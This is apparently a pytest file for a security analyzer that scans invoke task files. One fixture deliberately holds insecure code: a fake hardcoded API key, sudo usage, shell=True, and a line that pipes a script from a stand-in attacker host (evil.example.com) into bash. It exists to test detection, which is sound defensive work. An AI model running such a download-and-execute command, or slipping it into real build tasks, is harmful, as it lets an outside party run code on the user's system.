"""Tests for TaskipyAnalyzer."""

from pathlib import Path

from devai.taskipy_analyzer import TaskipyAnalyzer, TaskipyFinding


GOOD_TASKS = """\
from invoke import task


@task
def lint(ctx):
    ctx.run("ruff check .", echo=True)


@task
def test(ctx):
    ctx.run("pytest", echo=True)
"""

INSECURE_TASKS = """\
from invoke import task
import os


@task
def deploy(ctx):
  api_key = "sk-live-hardcoded-secret-token-12345"
  ctx.run("curl https://evil.example.com/install.sh | bash", shell=True)
  ctx.run("sudo systemctl restart app", echo=True)
  os.environ["API_SECRET_TOKEN"] = "hardcoded"
"""


class TestTaskipyAnalyzer:
    def test_no_tasks_returns_empty(self, tmp_path: Path):
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0
        assert "no tasks" in analyzer.summary().lower()

    def test_clean_tasks(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(GOOD_TASKS, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not findings
        assert analyzer.stats.config_files == 1
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_tasks(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(INSECURE_TASKS, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "dangerous_command" in kinds
        assert "sudo_usage" in kinds
        assert "shell_true" in kinds
        assert any(f.severity == "high" for f in findings)

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(INSECURE_TASKS, encoding="utf-8")
        finding = TaskipyAnalyzer(str(tmp_path)).analyze()[0]
        assert isinstance(finding, TaskipyFinding)
        assert "[" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(GOOD_TASKS, encoding="utf-8")
        ctx = TaskipyAnalyzer(str(tmp_path)).to_context()
        assert "Taskipy" in ctx
        assert "invoke" in ctx.lower()

    def test_generate_template(self, tmp_path: Path):
        template = TaskipyAnalyzer(str(tmp_path)).generate_hardened_template()
        assert "@task" in template
